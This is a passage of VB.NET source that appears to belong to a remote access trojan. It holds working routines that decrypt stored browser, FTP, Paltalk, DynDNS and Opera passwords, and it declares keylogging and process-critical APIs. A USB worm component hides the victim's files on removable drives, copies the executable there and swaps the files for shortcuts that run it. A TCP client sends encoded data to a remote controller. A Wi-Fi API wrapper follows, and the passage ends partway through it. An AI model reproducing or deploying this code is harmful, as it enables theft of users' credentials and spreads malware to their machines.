                Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                ProcessIEPass(strRess, strHash, dataOut)
                Marshal.FreeHGlobal(New IntPtr(Entropy.pbData))
                LocalFree(dataOut.pbData)
            End If
        End Sub
        Protected Function CopyString(ByVal ptr As IntPtr) As String
            Return Marshal.PtrToStringUni(ptr)
        End Function
        Public Sub Refresh()
            Try
                ' OL += vbNewLine & "###IE" & vbNewLine
                Dim i As Integer
                Dim hFile As Integer
                Dim dwSize As Integer
                Dim ptr As IntPtr
                Dim centry As INTERNET_CACHE_ENTRY_INFO
                Dim hKey1 As Integer
                Dim hKey2 As Integer
                Dim url As String
                Dim nameRegex As New System.Text.RegularExpressions.Regex("name=""([^""]+)""", System.Text.RegularExpressions.RegexOptions.Compiled)
                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\IntelliForms\Storage1", 0, KEY_READ, hKey1)
                RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\IntelliForms\Storage2", 0, KEY_READ, hKey2)
                If hKey2 <> 0 OrElse hKey1 <> 0 Then
                    hFile = FindFirstUrlCacheEntry(vbNullString, IntPtr.Zero, dwSize)
                    If dwSize > 0 Then
                        ptr = Marshal.AllocHGlobal(dwSize)
                        Marshal.WriteInt32(ptr, dwSize)
                        hFile = FindFirstUrlCacheEntry(vbNullString, ptr, dwSize)
                        Do
                            centry = CType(Marshal.PtrToStructure(ptr, centry.GetType()), INTERNET_CACHE_ENTRY_INFO)
                            If (centry.CacheEntryType And (NORMAL_CACHE_ENTRY Or URLHISTORY_CACHE_ENTRY)) <> 0 Then
                                url = GetStrFromPtrA(New IntPtr(centry.lpszSourceUrlName))
                                If url.IndexOf("?") >= 0 Then url = url.Substring(0, url.IndexOf("?"))
                                If (InStr(url, "@") > 0) Then url = Mid(url, InStr(url, "@") + 1)
                                If hKey1 <> 0 AndAlso (centry.CacheEntryType And NORMAL_CACHE_ENTRY) = NORMAL_CACHE_ENTRY Then
                                    Dim header As String = GetStrFromPtrA(New IntPtr(centry.lpHeaderInfo))
                                    If Not String.IsNullOrEmpty(header) AndAlso header.Contains("text/html") Then
                                        Dim localName As String = GetStrFromPtrA(New IntPtr(centry.lpszLocalFileName))
                                        Try
                                            For Each input As System.Text.RegularExpressions.Match In nameRegex.Matches(System.IO.File.ReadAllText(localName))
                                                AddPasswdInfo(input.Groups(1).Value, hKey1)
                                            Next
                                        Catch
                                        End Try
                                    End If
                                End If
                                AddPasswdInfo(url, hKey2)
                            End If
                            dwSize = 0
                            Call FindNextUrlCacheEntry(hFile, IntPtr.Zero, dwSize)
                            Marshal.FreeHGlobal(ptr)
                            If dwSize > 0 Then
                                ptr = Marshal.AllocHGlobal(dwSize)
                                Marshal.WriteInt32(ptr, dwSize)
                            End If
                        Loop While FindNextUrlCacheEntry(hFile, ptr, dwSize) <> 0
                        FindCloseUrlCache(hFile)
                    End If
                    RegCloseKey(hKey1)
                    RegCloseKey(hKey2)
                End If
                Dim str_Renamed As String
                Dim dwNbCred, lpCredentials As Integer
                Dim szAuth, strRess As String
                Dim Cred As CREDENTIAL
                Dim dataOut, dataIn, Entropy As DATA_BLOB
                Dim tAuth() As String
                Dim pos As Integer
                str_Renamed = "Microsoft_WinInet_*"
                Call CredEnumerate(str_Renamed, 0, dwNbCred, lpCredentials)
                Dim iBufEntropy(36) As Short
                Dim guid As String
                Dim k As Integer
                If dwNbCred > 0 Then
                    For i = 0 To dwNbCred - 1
                        ptr = Marshal.ReadIntPtr(New IntPtr(lpCredentials + i * 4))
                        Cred = CType(Marshal.PtrToStructure(ptr, Cred.GetType), CREDENTIAL)
                        strRess = CopyString(New IntPtr(Cred.lpstrTargetName))
                        Entropy.cbData = 74
                        ptr = Marshal.AllocHGlobal(74)
                        guid = "abe2869f-9b47-4cd9-a358-c22904dba7f7" & vbNullChar
                        For k = 0 To 36
                            Marshal.WriteInt16(ptr, k * 2, CShort(Asc(Mid(guid, k + 1, 1)) * 4))
                        Next
                        Entropy.pbData = ptr.ToInt32()
                        dataIn.pbData = Cred.lpbCredentialBlob
                        dataIn.cbData = Cred.dwCredentialBlobSize
                        dataOut.cbData = 0
                        dataOut.pbData = 0
                        Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                        Marshal.FreeHGlobal(ptr)
                        szAuth = Marshal.PtrToStringUni(New IntPtr(dataOut.pbData))
                        tAuth = Split(szAuth, ":")
                        pos = InStr(Mid(strRess, 19), "/")
                        OL += "|URL| " & Mid(strRess, 19, pos - 1) & vbNewLine & "|USR| " & tAuth(0) & vbNewLine & "|PWD| " & tAuth(1) & vbNewLine

                        LocalFree(dataOut.pbData)
                    Next
                End If
                CredFree(lpCredentials)
                Dim ftpAccounts As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\FTP\Accounts")
                For Each account As String In ftpAccounts.GetSubKeyNames()
                    Dim accountKey As Microsoft.Win32.RegistryKey = ftpAccounts.OpenSubKey(account)
                    For Each user As String In accountKey.GetSubKeyNames()
                        Dim userKey As Microsoft.Win32.RegistryKey = accountKey.OpenSubKey(user)
                        Dim pass() As Byte = CType(userKey.GetValue("Password"), Byte())
                        Dim dwEntropy(3) As Byte
                        For j As Integer = 0 To account.Length - 1
                            Dim c As Byte = CByte(AscW(account(j)) And &H1F)
                            dwEntropy(j And 3) = dwEntropy(j And 3) + c
                        Next
                        dataIn.cbData = pass.Length
                        dataIn.pbData = Marshal.AllocHGlobal(pass.Length).ToInt32()
                        Marshal.Copy(pass, 0, New IntPtr(dataIn.pbData), pass.Length)
                        dataOut.cbData = 0
                        dataOut.pbData = 0
                        Dim gc As GCHandle = GCHandle.Alloc(dwEntropy, GCHandleType.Pinned)
                        Entropy.pbData = gc.AddrOfPinnedObject().ToInt32()
                        Entropy.cbData = 4
                        CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                        gc.Free()
                        OL += "|URL| " & String.Format("ftp://{0}@{1}/", account, user) & vbNewLine & "|USR| " & user & vbNewLine & "|PWD| " & Marshal.PtrToStringUni(New IntPtr(dataOut.pbData)) & vbNewLine

                        LocalFree(dataOut.pbData)
                    Next
                Next
            Catch ex As Exception
            End Try
        End Sub
    End Class
#End Region
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Sub paltalk()
        Try
            '  OL += vbNewLine & "###Paltalk" & vbNewLine
            Dim ser() As Char = HWD.ToCharArray
            Dim reg As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim out As String = ""
            reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Paltalk")
            Dim users As String() = reg.GetSubKeyNames()
            reg.Close()
            For Each s As String In users
                Dim t, o, i, x As Integer
                Dim pass As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\Software\Paltalk\" & s, "pwd", "")
                Dim chr1 As Char() = pass.ToCharArray
                Dim passarr(pass.Length / 4) As String
                While t <= UBound(chr1) - 4
                    If t < UBound(chr1) - 4 Then
                        passarr(o) = chr1(t) & chr1(t + 1) & chr1(t + 2)
                    End If
                    t += 4
                    o += 1
                End While
                Dim key As String = ""
                For Each c As Char In s
                    key += c
                    If i <= UBound(ser) Then
                        key += ser(i)
                    End If
                    i = i + 1
                Next
                key = key & key & key
                Dim chr_arr As Char() = key.ToCharArray
                Dim blainpass As String = ""
                blainpass += Chr(passarr(0) - 122 - Asc(key.Substring(key.Length - 1, 1)))
                For x = 1 To UBound(passarr)
                    Dim tempchr As Char
                    If passarr(x) Is Nothing Then
                    Else
                        tempchr = Chr(passarr(x) - x - Asc(chr_arr(x - 1)) - 122)
                        blainpass += tempchr
                    End If
                Next x
                OL += "|URL| http://Paltalk.com" & vbNewLine & "|USR| " & s & vbNewLine & "|PWD| " & blainpass & vbNewLine

            Next
        Catch ex As Exception
        End Try
    End Sub
    Sub dyn()
        'DynDNS.com
        Try
            '  OL += vbNewLine & "###DynDNS" & vbNewLine
            Dim p = Replace(Environ("ALLUSERSPROFILE") & "\", "\\", "\")
            Dim pp = p & "DynDNS\Updater\config.dyndns"
            Dim usr As String
            Dim ps As String
            Dim pas As String
            Dim ii As Integer
            If IO.File.Exists(pp) = True Then
                Dim A As Array = IO.File.ReadAllLines(pp)
                For Each s As String In A
                    If InStr(s.ToLower, "username=") > 0 Then
                        usr = Split(s, "=")(1)
                    End If
                    If InStr(s.ToLower, "password=") > 0 Then
                        ps = Split(s, "=")(1)
                        For i = 1 To Len(ps) Step 2
                            pas = pas & Chr(Val("&H" & Mid(ps, i, 2)))
                        Next i
                        For i = 1 To Len(pas)
                            Mid(pas, i, 1) = Chr((Asc(Mid(pas, i, 1))) Xor (Asc(Mid("t6KzXhCh", ii + 1, 1))))
                            ii = ((ii + 1) Mod 8)
                        Next i
                        If usr.Length = 0 Then Exit Sub
                        OL += "|URL| http://DynDns.com" & vbNewLine & "|USR| " & usr & vbNewLine & "|PWD| " & pas & vbNewLine

                        Exit Sub
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
#Region "Opera"
    Private opera_salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3, _
    &HE8, &H69, &H73, &HAF, &HFF}
    Private key_size As Byte() = {&H0, &H0, &H0, &H8}
    Private path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public DOutput As String
    Public Sub GetOpera()
        '  OL += vbNewLine & "###Opera" & vbNewLine
        If File.Exists(path & "\Opera\Opera\wand.dat") Then
            path += "\Opera\Opera\wand.dat"
        Else
            If File.Exists(path & "\Opera\Opera\profile\wand.dat") Then
                path += "\Opera\Opera\profile\wand.dat"
            End If
        End If
        Dim Q As String = ""

        Try
            Dim wand_file As Byte() = File.ReadAllBytes(path)
            Dim block_size As Integer = 0
            For i As Integer = 0 To wand_file.Length - 5
                If wand_file(i) = &H0 AndAlso wand_file(i + 1) = &H0 AndAlso wand_file(i + 2) = &H0 AndAlso wand_file(i + 3) = &H8 Then
                    block_size = CInt(wand_file(i + 15))
                    Dim key As Byte() = New Byte(7) {}
                    Dim encrypt_data As Byte() = New Byte(block_size - 1) {}
                    Array.Copy(wand_file, i + 4, key, 0, key.Length)
                    Array.Copy(wand_file, i + 16, encrypt_data, 0, encrypt_data.Length)
                    DOutput += decrypt2_method(key, encrypt_data) & vbNewLine
                    i += 11 + block_size
                End If
            Next
            Dim A As String() = Split(DOutput, vbNewLine)
            For i As Integer = 0 To A.Length - 1
                Dim w As String = FL(A(i))
                Dim url As String = ""
                Dim U As String = ""
                Dim P As String = ""
                If w.ToLower.StartsWith("http://") Or w.ToLower.StartsWith("https://") Then
                    url = w
                    If i + 2 < A.Length Then
                        For ii As Integer = i + 1 To i + 2
                            Dim xx As String = A(ii)
                            If xx.ToLower.StartsWith("http://") Or xx.ToLower.StartsWith("https://") Then
                                Exit For
                            End If
                            If ii = i + 2 Then
                                U = FL(xx)
                            End If
                        Next
                    End If
                    If i + 4 < A.Length Then
                        For ii As Integer = i + 1 To i + 4
                            Dim xx As String = A(ii)
                            If xx.ToLower.StartsWith("http://") Or xx.ToLower.StartsWith("https://") Then
                                Exit For
                            End If
                            If ii = i + 4 Then
                                P = FL(xx)
                            End If
                        Next
                    End If
                    OL += "|URL| " & url & vbNewLine & "|USR| " & U & vbNewLine & "|PWD| " & P & vbNewLine

                End If
            Next
        Catch ex As Exception
        End Try
    End Sub
    Function FL(ByVal s As String) As String
        Dim f As String = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+="
        Dim w As String = ""
        For Each xx As String In s
            If f.Contains(xx.ToLower) Then
                w &= xx
            End If
        Next
        Return w
    End Function
    Public Function decrypt2_method(ByVal key As Byte(), ByVal encrypt_data As Byte())
        Try
            Dim md5Crypt As New MD5CryptoServiceProvider()
            md5Crypt.Initialize()
            Dim tmpBuffer As Byte() = New Byte(opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(opera_salt, tmpBuffer, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, opera_salt.Length, key.Length)
            Dim hash1 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
            tmpBuffer = New Byte(hash1.Length + opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(hash1, tmpBuffer, hash1.Length)
            Array.Copy(opera_salt, 0, tmpBuffer, hash1.Length, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, hash1.Length + opera_salt.Length, key.Length)
            Dim hash2 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
            Dim tripleDES As New TripleDESCryptoServiceProvider()
            tripleDES.Mode = CipherMode.CBC
            tripleDES.Padding = PaddingMode.None
            Dim tripleKey As Byte() = New Byte(23) {}
            Dim IV As Byte() = New Byte(7) {}
            Array.Copy(hash1, tripleKey, hash1.Length)
            Array.Copy(hash2, 0, tripleKey, hash1.Length, 8)
            Array.Copy(hash2, 8, IV, 0, 8)
            tripleDES.Key = tripleKey
            tripleDES.IV = IV
            Dim decryter As ICryptoTransform = tripleDES.CreateDecryptor()
            Dim output As Byte() = decryter.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length)
            Dim enc As String = Encoding.Unicode.GetString(output)
            Return enc
        Catch e As Exception
            Return ""
        End Try
    End Function
#End Region
#End Region
    <DllImport("winmm.dll")> _
    Public Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
    End Function
    <System.Runtime.InteropServices.DllImport("user32")>
    Public Function GetAsyncKeyState(ByVal xxx As System.Windows.Forms.Keys) As Short
    End Function
    <DllImport("NTDLL")>
    Public Sub RtlSetProcessIsCritical(ByVal nv As Boolean, ByVal ov As Integer, ByVal wl As Boolean)
    End Sub
    <DllImport("User32")> Private Function ShowWindowe(ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
    End Function
    <DllImport("KERNEL32.DLL")> _
    Public Sub Beep(ByVal freq As Integer, ByVal dur As Integer)
    End Sub
    <DllImport("user32.dll")> _
    Public Function SendMessageW(ByVal hWnd As IntPtr, _
               ByVal Msg As Integer, ByVal wParam As IntPtr, _
               ByVal lParam As IntPtr) As IntPtr
    End Function
#Region "USB_ShortCut"
    Private Class USB
        Private Off As Boolean = False
        Dim thread As Threading.Thread = Nothing
        Dim r As New Random
        Private ExeName As String = r.Next(199997, 88886777) & ".exe"
        Sub Start()
            If thread Is Nothing Then
                thread = New Threading.Thread(AddressOf usb, 1)
                thread.Start()
            End If
        End Sub
        Sub clean()
            Off = True
            Do Until thread Is Nothing
                Threading.Thread.CurrentThread.Sleep(1)
            Loop
            For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.DriveType = IO.DriveType.Removable Or _
                        x.DriveType = IO.DriveType.CDRom Then
                            If IO.File.Exists(x.Name & ExeName) Then
                                IO.File.SetAttributes(x.Name _
                                & ExeName, IO.FileAttributes.Normal)
                                IO.File.Delete(x.Name & ExeName)
                            End If
                            For Each xx As String In IO.Directory.GetFiles(x.Name)
                                Try
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                    If xx.ToLower.EndsWith(".lnk") Then
                                        IO.File.Delete(xx)
                                    End If
                                Catch ex As Exception
                                End Try
                            Next
                            For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                Try
                                    With New IO.DirectoryInfo(xx)
                                        .Attributes = IO.FileAttributes.Normal
                                    End With
                                Catch ex As Exception
                                End Try
                            Next
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
        End Sub
        Sub usb()
            Off = False
            Do Until Off = True
                For Each x In IO.DriveInfo.GetDrives
                    Try
                        If x.IsReady Then
                            If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType _
                            .Removable Or x.DriveType = IO.DriveType.CDRom Then
                                Try
                                    If IO.File.Exists(x.Name & ExeName) Then
                                        IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                    End If
                                    IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                    For Each xx As String In IO.Directory.GetFiles(x.Name)
                                        If IO.Path.GetExtension(xx).ToLower <> ".lnk" And _
                                        xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                            IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                            IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            With CreateObject("WScript.Shell").CreateShortcut _
                                            (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                                .TargetPath = "cmd.exe"
                                                .WorkingDirectory = ""
                                                .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                                 & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                                .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                                .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                                .Save()
                                            End With
                                        End If
                                    Next
                                    For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                        With CreateObject("WScript.Shell") _
                                        .CreateShortcut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                             & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
                                             IO.DirectoryInfo(xx).Name & """ & exit"
                                            .IconLocation = "%SystemRoot%\system32\SHELL32.dll,3" '< folder icon :D
                                            .Save()
                                        End With
                                    Next
                                Catch ex As Exception
                                End Try
                            End If
                        End If
                    Catch ex As Exception
                    End Try
                Next
                Threading.Thread.CurrentThread.Sleep(3000)
            Loop
            thread = Nothing
        End Sub
        Private Function GetIcon(ByVal ext As String) As String
            Try
                Dim r = Microsoft.Win32.Registry _
                .LocalMachine.OpenSubKey("Software\Classes\", False)
                Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
                .GetValue("") & "\DefaultIcon\").GetValue("", "")
                If e.Contains(",") = False Then e &= ",0"
                Return e
            Catch ex As Exception
                Return ""
            End Try
        End Function
    End Class
#End Region '''Usb ShortCut
#Region "Socket_Class"
    Public Class k
        Private C As TcpClient
        Public Event Connected()
        Public Event Disconnected()
        Public Event Data(ByVal b As Byte())
        Private IsBuzy As Boolean = False
        Public Function Statconnected() As Boolean

            Try


                If C.Client.Connected = True Then
                    Return True
                Else
                    Return False

                End If

            Catch ex As Exception
            End Try
        End Function
        Sub Connect(ByVal h As String, ByVal p As Integer)
            Try
                Try
                    If C IsNot Nothing Then
                        C.Close()
                        C = Nothing
                    End If
                Catch ex As Exception
                End Try
                Do Until IsBuzy = False
                    Threading.Thread.CurrentThread.Sleep(1)
                Loop
                Try
                    C = New TcpClient

                    C.Connect(h, p)
                    Dim t As New Threading.Thread(AddressOf RC, 10)
                    t.Start()
                    RaiseEvent Connected()
                Catch ex As Exception
                End Try
            Catch ex As Exception
                RaiseEvent Disconnected()
            End Try
        End Sub
        Private SPL As String = "sb-lj"
        Sub DisConnect()
            Try
                C.Close()
            Catch ex As Exception
            End Try
            C = Nothing
            RaiseEvent Disconnected()
        End Sub
        Sub Send(ByVal s As String)
            Try
                Send(SB(s))
            Catch ex As Exception

            End Try

        End Sub
        Sub Send(ByVal b As Byte())
            Dim base64Encoded As String
            base64Encoded = System.Convert.ToBase64String(b)
            b = SB(base64Encoded)
            Try
                Dim m As New IO.MemoryStream
                m.Write(b, 0, b.Length)
                m.Write(SB(SPL), 0, SPL.Length)
                C.Client.Send(m.ToArray, 0, m.Length, SocketFlags.None)
            Catch ex As Exception
                DisConnect()
            End Try
        End Sub
        Private Sub RC()
            IsBuzy = True
            Dim M As New IO.MemoryStream
            Dim cc As Integer = 0
re:
            Threading.Thread.CurrentThread.Sleep(1)

            Try
                If C Is Nothing Then
                    GoTo co
                Else
                    If C.Client.Connected = False Then
                        GoTo co
                    Else
                        cc += 1
                        If cc > 100 Then
                            cc = 0
                            Try
                                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then
                                    GoTo co
                                End If
                            Catch ex As Exception
                                GoTo co
                            End Try
                        End If

                    End If
                End If
                If C.Available > 0 Then
                    Dim B(C.Available - 1) As Byte
                    C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                    M.Write(B, 0, B.Length)
rr:
                    If BS(M.ToArray).Contains(SPL) Then
                        Dim A As Array = fx(M.ToArray, SPL)
                        RaiseEvent Data(A(0))
                        M.Dispose()
                        M = New IO.MemoryStream
                        If A.Length = 2 Then
                            M.Write(A(1), 0, A(1).length)
                            Threading.Thread.CurrentThread.Sleep(1)
                            GoTo rr
                        End If
                    End If
                End If
            Catch ex As Exception
                GoTo co
            End Try
            GoTo re
co:
            IsBuzy = False
            DisConnect()
        End Sub


    End Class
#End Region ''' Socket_Connector
End Module
#Region "Classes"
Namespace NativeWifi
    Public NotInheritable Class Wlan
        Private Sub New()
        End Sub
#Region "P/Invoke API"
        ''' <summary>
        ''' Defines various opcodes used to set and query parameters for an interface.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_INTF_OPCODE</c> type.
        ''' </remarks>
        Public Enum WlanIntfOpcode
            ''' <summary>
            ''' Opcode used to set or query whether auto config is enabled.
            ''' </summary>
            AutoconfEnabled = 1
            ''' <summary>
            ''' Opcode used to set or query whether background scan is enabled.
            ''' </summary>
            BackgroundScanEnabled
            ''' <summary>
            ''' Opcode used to set or query the media streaming mode of the driver.
            ''' </summary>
            MediaStreamingMode
            ''' <summary>
            ''' Opcode used to set or query the radio state.
            ''' </summary>
            RadioState
            ''' <summary>
            ''' Opcode used to set or query the BSS type of the interface.
            ''' </summary>
            BssType
            ''' <summary>
            ''' Opcode used to query the state of the interface.
            ''' </summary>
            InterfaceState
            ''' <summary>
            ''' Opcode used to query information about the current connection of the interface.
            ''' </summary>
            CurrentConnection
            ''' <summary>
            ''' Opcose used to query the current channel on which the wireless interface is operating.
            ''' </summary>
            ChannelNumber
            ''' <summary>
            ''' Opcode used to query the supported auth/cipher pairs for infrastructure mode.
            ''' </summary>
            SupportedInfrastructureAuthCipherPairs
            ''' <summary>
            ''' Opcode used to query the supported auth/cipher pairs for ad hoc mode.
            ''' </summary>
            SupportedAdhocAuthCipherPairs
            ''' <summary>
            ''' Opcode used to query the list of supported country or region strings.
            ''' </summary>
            SupportedCountryOrRegionStringList
            ''' <summary>
            ''' Opcode used to set or query the current operation mode of the wireless interface.
            ''' </summary>
            CurrentOperationMode
            ''' <summary>
            ''' Opcode used to query driver statistics.
            ''' </summary>
            Statistics = &H10000101
            ''' <summary>
            ''' Opcode used to query the received signal strength.
            ''' </summary>
            RSSI
            SecurityStart = &H20010000
            SecurityEnd = &H2FFFFFFF
            IhvStart = &H30000000
            IhvEnd = &H3FFFFFFF
        End Enum

        ''' <summary>
        ''' Specifies the origin of automatic configuration (auto config) settings.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_OPCODE_VALUE_TYPE</c> type.
        ''' </remarks>
        Public Enum WlanOpcodeValueType
            ''' <summary>
            ''' The auto config settings were queried, but the origin of the settings was not determined.
            ''' </summary>
            QueryOnly = 0
            ''' <summary>
            ''' The auto config settings were set by group policy.
            ''' </summary>
            SetByGroupPolicy = 1
            ''' <summary>
            ''' The auto config settings were set by the user.
            ''' </summary>
            SetByUser = 2
            ''' <summary>
            ''' The auto config settings are invalid.
            ''' </summary>
            Invalid = 3
        End Enum

        Public Const WLAN_CLIENT_VERSION_XP_SP2 As UInteger = 1
        Public Const WLAN_CLIENT_VERSION_LONGHORN As UInteger = 2

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanOpenHandle(<[In]()> ByVal clientVersion As UInt32, <[In](), Out()> ByVal pReserved As IntPtr, <Out()> ByRef negotiatedVersion As UInt32, <Out()> ByRef clientHandle As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanCloseHandle(<[In]()> ByVal clientHandle As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanEnumInterfaces(<[In]()> ByVal clientHandle As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr, <Out()> ByRef ppInterfaceList As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanQueryInterface(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal opCode As WlanIntfOpcode, <[In](), Out()> ByVal pReserved As IntPtr, <Out()> ByRef dataSize As Integer, <Out()> ByRef ppData As IntPtr, _
   <Out()> ByRef wlanOpcodeValueType As WlanOpcodeValueType) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanSetInterface(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal opCode As WlanIntfOpcode, <[In]()> ByVal dataSize As UInteger, <[In]()> ByVal pData As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr) As Integer
        End Function

        ''' <param name="pDot11Ssid">Not supported on Windows XP SP2: must be a <c>null</c> reference.</param>
        ''' <param name="pIeData">Not supported on Windows XP SP2: must be a <c>null</c> reference.</param>
        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanScan(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal pDot11Ssid As IntPtr, <[In]()> ByVal pIeData As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr) As Integer
        End Function

        ''' <summary>
        ''' Defines flags passed to <see cref="WlanGetAvailableNetworkList"/>.
        ''' </summary>
        <Flags()> _
        Public Enum WlanGetAvailableNetworkFlags
            ''' <summary>
            ''' Include all ad-hoc network profiles in the available network list, including profiles that are not visible.
            ''' </summary>
            IncludeAllAdhocProfiles = &H1
            ''' <summary>
            ''' Include all hidden network profiles in the available network list, including profiles that are not visible.
            ''' </summary>
            IncludeAllManualHiddenProfiles = &H2
        End Enum

        ''' <summary>
        ''' The header of an array of information about available networks.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanAvailableNetworkListHeader
            ''' <summary>
            ''' Contains the number of <see cref=""/> items following the header.
            ''' </summary>
            Public numberOfItems As UInteger
            ''' <summary>
            ''' The index of the current item. The index of the first item is 0.
            ''' </summary>
            Public index As UInteger
        End Structure

        ''' <summary>
        ''' Contains various flags for the network.
        ''' </summary>
        <Flags()> _
        Public Enum WlanAvailableNetworkFlags
            ''' <summary>
            ''' This network is currently connected.
            ''' </summary>
            Connected = &H1
            ''' <summary>
            ''' There is a profile for this network.
            ''' </summary>
            HasProfile = &H2
        End Enum

        ''' <summary>
        ''' Contains information about an available wireless network.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
        Public Structure WlanAvailableNetwork
            ''' <summary>
            ''' Contains the profile name associated with the network.
            ''' If the network doesn't have a profile, this member will be empty.
            ''' If multiple profiles are associated with the network, there will be multiple entries with the same SSID in the visible network list. Profile names are case-sensitive.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=256)> _
            Public profileName As String
            ''' <summary>
            ''' Contains the SSID of the visible wireless network.
            ''' </summary>
            Public dot11Ssid As Dot11Ssid
            ''' <summary>
            ''' Specifies whether the network is infrastructure or ad hoc.
            ''' </summary>
            Public dot11BssType As Dot11BssType
            ''' <summary>
            ''' Indicates the number of BSSIDs in the network.
            ''' </summary>
            Public numberOfBssids As UInteger
            ''' <summary>
            ''' Indicates whether the network is connectable or not.
            ''' </summary>
            Public networkConnectable As Boolean
            ''' <summary>
            ''' Indicates why a network cannot be connected to. This member is only valid when <see cref="networkConnectable"/> is <c>false</c>.
            ''' </summary>
            Public wlanNotConnectableReason As WlanReasonCode
            ''' <summary>
            ''' The number of PHY types supported on available networks.
            ''' The maximum value of this field is 8. If more than 8 PHY types are supported, <see cref="morePhyTypes"/> must be set to <c>true</c>.
            ''' </summary>
            Private numberOfPhyTypes As UInteger
            ''' <summary>
            ''' Contains an array of <see cref="Dot11PhyType"/> values that represent the PHY types supported by the available networks.
            ''' When <see cref="numberOfPhyTypes"/> is greater than 8, this array contains only the first 8 PHY types.
            ''' </summary>
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=8)> _
            Private m_dot11PhyTypes As Dot11PhyType()
            ''' <summary>
            ''' Gets the <see cref="Dot11PhyType"/> values that represent the PHY types supported by the available networks.
            ''' </summary>
            Public ReadOnly Property Dot11PhyTypes() As Dot11PhyType()
                Get
                    Dim ret As Dot11PhyType() = New Dot11PhyType(numberOfPhyTypes - 1) {}
